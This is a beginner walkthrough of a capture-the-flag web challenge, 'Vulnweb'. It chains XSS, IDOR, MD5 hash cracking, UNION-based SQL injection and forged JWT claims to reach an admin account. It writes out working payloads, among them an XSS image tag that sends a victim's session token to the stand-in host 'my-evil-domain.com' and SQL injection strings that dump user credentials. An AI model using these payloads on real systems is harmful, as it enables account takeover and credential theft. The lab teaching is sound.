# Vulnweb Walkthrough

This is a complete walkthrough of the Vulnweb security challenge aimed at beginners in the realm of cyber security. Basic knowledge of web programming is required (HTML, JavaScript, SQL, JWT).

## Walking the application

Before we attempt to exploit any potential security vulnerablities in the application, we need to get an overview of the functionality provided by the application. This helps in finding all attack vectors and ultimately in finding security vulnerabilities that can be exploited.

Start by creating an account and try out everything that the site has to offer. Think about where we can supply user input. Because user input is where the exploitation will take place.

After doing that we have identified the following functionality:

| Feature | User Input |
| ----------- | ----------- |
| Create a new note | title & text input fields |
| View all my notes | - |
| View an specific note | id path variable |
| Edit a note | title & text input fields, id path variable |
| Delete a note | id path variable |
| Search my notes (permium only) | search input field |
| Register | username, password & repeat password input fields |
| Login | username & password input fields |
| Logout | - |

## Cross Site Scripting (XSS)

The first vulnerability we will test for is Cross Site Scripting. This is a very common vulnerability in websites and its impact to the website can vary from harmless to critical. 

Before we can test for this vulnerability, we first need to understand how it works. Cross Site Scripting works by injecting malicuous JavaScript code into a website that then gets run on the clients browser. This is usually done in a place where user input gets displayed back to the user and the input is not handled properly by the web application.

So, knowing this, what functionality in our Vulnweb application could be used to test for XSS?

Creating and viewing a note is the perfect use case to test for XSS because it takes user input and displays it back to the user. So lets try the following code in the "title" and "text" input field upon creating a note to test if the supplied html tags get interpreted or not:
```html
<button>test</button>
```
When viewing the note, we see that the button from the text field gets rendered by the browser, which validates our XSS vulnerability.

Now lets try to execute JavaScript code with this vulernability:
```html
<script>alert(1)</script>
```

Surprisingly, our JavaScript code was not executed, even though the script tag was interpreted by the browser. Let's try another method instead:
```html
 <img src=x onerror="alert(1)">
```

And voilà! We get the alert popup and have successfully exploited a XSS vulnerability.

Now, displaying alert boxes on peoples browsers doesn't pose a big security threat to the website. So what can we do with this vulnerability, which will increase its impact? We can abuse this vulnerability to steal authentication tokens of logged in users, which will allow us to log in as someone else (also called Session Hijacking). This can be achieved with this code:
```html
  <img src=x onerror="this.src='http://www.my-evil-domain.com/?token='+localStorage.getItem('token');">
```
Here we assume that we, as an attacker, have control over the www.my-evil-domain.com webserver and can view the logs. We can now send the link to this newly created note to our victim and if they click the link, their authentication token will be sent to our webserver and we can use it to log into Vulnweb as their user.

Note that Session Hijacking via XSS is only possible when our JavaScript code is saved in the web application and can be viewed by other users.

We have found our first vulnerability! It doesn't seem to help us in achieving our goal, which is getting access to an admin account, because we don't know any admins on the website. So let's keep looking for other vulnerabilities.

## Insecure Direct Object References (IDOR) / Broken Access Control

Another very common vulnerability in web applications is Insecure Direct Object Reference (IDOR) which falls under the broader term of Broken Access Control. Broken Access Control just means that an application doens't check sufficiently, if a user has access to a requested resource or not. And IDOR works in accessing resources on the application by changing an ID that is supplied by the user to one that doesn't belong to us. If the application doens't prevent us from accessing the data of the new ID, we have ourselves an IDOR vulnerability.

Knowing this, what functionality in our Vulnweb application could be used to test for IDOR?

Viewing a specific note requires us to supply the ID of the note in the URL. This sounds like a perfect candidate for an IDOR vulnerability, so let's test for it. The best way to do this is to create a new user, create a note and write down the ID of the new note. Then log back in to your initial user and try to access the note by changing the URL path variable to the ID you have writte down. The app doesn't prevent you from accessing the note, so you have successfully verified an IDOR vulnerability.

Now that we know we have access to all notes on the web application, we need to find the IDs of existing notes which could potentially contain sensitive data. One way would be to start with ID 1 and go from there until we find an existing ID. The first few tries we will be greeted with a 404 error screen. Once we reach ID 15 we get access to a note containing sensitive data. This note seems to be an export of all the data the website has on this particular user, including ID, username, password hash and his roles.

## Insecure Hashing Algorithms / Weak Passwords

Passwords shouldn't be written to a database in cleartext, because if an attacker gets access to the database, he can use the credentials to log into not only this app but every app which has the same username and password combination found in the database. So it is considered best practice to write only password hashes instead of the cleartext passwords to the database. Hashes are complex algorithms that transform an input (in our case the password) into a fixed length string, that looks random. Given the input string, the algorithm will always produce the same output string. But it's impossible to reverse the process and find the input when all we have is the output.

So, this means that even though we have obtained the hash of the user "tommy", we cannot find the password which generated the hash. At least in theory. In practice, it's not that simple.

Since a password always generates the same hash, we can start to hash common passwords until we find one that matches our hash from the user "tommy". We don't need to do all this work of hashing millions of common passwords ourselves, because there exist many such lists on the internet (called rainbow tables). There also exist services on the web that will allow you to enter a hash and give you the corresponding password, if the hash was found in its rainbow tables.

There are a lot of hashing algorithms out there. So in order for us to crack this hash, we first need to identify the algorithm that was used. There are many online tools which help us in doing that. For this example we are going to use https://hashes.com/en/tools/hash_identifier. Entering the hash into this website, we find that it most likeley used the MD5 hashing algorithm.

MD5 is considered insecure for passwords. I won't go into detail as to why that is. If you would like to read more about it, check out this StackExchange thread: https://security.stackexchange.com/questions/19906/is-md5-considered-insecure. Nowadays there are better algorithms like bcrypt, that should be used instead.

Now that we know the hashing algorithm, we can use another tool like https://md5decrypt.net/en/ to crack the hash and find the password to the user "tommy".

## SQL Injection

SQL Injection is another vulernability which can be detremental to a website. It works by injecting SQL code into the database queries that the web applciation makes in the backend to retrieve data. For example our notes in the Vulnweb application are persistent, meaning they don't dissappear once we reload the page. So the application most likely saves our notes in a database somewhere. When we make a request to the homepage of Vulnweb, the application will query our notes in the backend and return them back to us. This query that occurs in the backend often takes user input as a means of customizing the output of the notes. This is where we, as an attacker, can inject malicuous SQL code to extract more data from the database than we should have access to. For example usernames and passwords.

Again, we will think about what features in the application could allow an SQL injection. Viewing a single note could be one candidate, because it takes in a id path variable as user input, which we could use as an injection point. There is another feature, that works ideally for SQL injections, but this feature was blocked behind a paywall until now: Searching notes. If we recall, the "tommy" user had an additional role "ROLE_PREMIUM" and since searching notes is only available for premium users, we can log in as tommy and use this feature to test for SQL injections.

Before we actually try to inject malicous SQL code, it helps to think about how the SQL query could look like in the backend. Since this is a search feature, we're gonna assume it looks something like this:

```SQL
SELECT * FROM note WHERE user_id = 1 AND title LIKE '%query%';
```

"query" is where we will try to inject our SQL code. A common payload which is used to verify SQL injection vulnerabilities looks like this:

```
' OR 1=1-- -
```

In the backend, the app would then create this query:

```SQL
SELECT * FROM note WHERE user_id = 1 AND title LIKE '%' OR 1=1-- -%';
```

which will return all notes if the injection was successful. After we submitted this payload, we suddenly get not only tommys notes but also all other notes that we created earlier. So this validates our SQL injection vulnerability.

Now that the vulernability has been validated, we can abuse it to read sensitive information contained within the database. Specifically, we are interested in the admin users of the application.

Currenlty we only get note data back from this query, but we can use a SQL featue called UNION SELECT to output data from other tables, including the user table. In order for this to work, we first need to test how many columns are returned from the query. Looking at the responses the backend makes, it seems like four columns are returned: id, title, text, user_id. We also need to be aware of the datatypes these columns use. Usually providing NULL for all columns works, but not in our case:

```
' UNION SELECT NULL,NULL,NULL,NULL-- -
```

This returns an error. Instead we can try the correct datatypes:

```
' UNION SELECT 1,'test','test',1-- -
```

The query in the backend looks like this:

```SQL
SELECT * FROM note WHERE user_id = 1 AND title LIKE '' UNION SELECT 1,'test','test',1-- -%';
```

We now see another note displayed with our "test" title and text. So now we know that the UNION SELECT works. Now we can extract the username and password values like this:

```
' UNION SELECT id, username, password, 1 FROM user-- -
```

Note that we are guessing the table and column names here. If those guesses didn't work, we would have to enumerate the table and column names first. But since our guesses were correct, we were able to skip this step.

And it did work! The app shows us all username and password hash combinations from the database. One user sticks out: "administratormike". It seems like we have found our admin user. It shouldn't be hard to crack his hash and log in as this admin user right? Well not exactly. It seems like he actually used a strong password and the hash cannot be cracked by brute force or with our online tools.

## Missing JWT Validation

Since we cannot crack the admins password, we need to find another way in. Looking at the way authentication is implemented in this application could be a good route to go on. Analyzing our outgoing requests, we see that we send a JSON Web Token (JWT) with every request.

JWTs might looks cryptic, but its essentially just a long Base64 encoded string that holds data about the token itself and about the user it authenticates. Since this token is only **encoded** and not **encrypted** (Read about the difference [here](https://stackoverflow.com/questions/4657416/difference-between-encoding-and-encryption)) we can easily decode it and read the information contained within. I like to use the official https://jwt.io/ website to do this. This website can also be used change the tokens data.

A JWT is divided into three parts: Header, Payload and Signature. The header contains metadata about the token, the payload contains standard and some custom information about the user it authenticates. And the signature verifies, that the information in the Header and Payload weren't changed in any way and are authentic.

So it might be a good idea to check if this JWT verification step is done correctly in the backend or if we can tamper with the token at our own will. Since we have all the needed information about the admin from our SQL injection exploit earlier, we can change the payload information to that of administratormike and then use the resulting token in our requests. Our payload now looks like this:

```JSON
{
  "sub": "administratormike",
  "iat": 1661436118,
  "exp": 1661472118,
  "iss": "vulnweb",
  "aud": "vulnweb-frontend",
  "id": 1,
  "roles": "ROLE_USER,ROLE_PREMIUM,ROLE_ADMIN"
}
```

Once we replaced the old token in LocalStorage with our tampered one and reloaded the page, we are logged in as an administrator and we successfully captured the flag!